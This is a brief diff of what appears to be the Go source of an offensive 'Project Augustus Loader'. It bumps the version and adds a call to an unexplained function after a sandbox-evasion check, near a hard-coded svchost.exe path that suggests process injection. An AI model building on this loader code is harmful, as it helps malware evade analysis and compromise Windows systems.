@@ -1,6 +1,6 @@
 /*
             Project Augustus Loader
-                VERSION: 1.1
+                VERSION: 1.2
  AUTHOR: @tunnelgre - https://twitter.com/tunnelgre
 	              
 
@@ -212,7 +212,7 @@ func main() {
     if CheckSandbox() {
         return 
     }
-	
+	zzzh()		
 	epath := []byte{
 		'C', ':', '\\', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 's', 'v', 'c', 'h', 'o', 's', 't', '.', 'e', 'x', 'e',
 	}
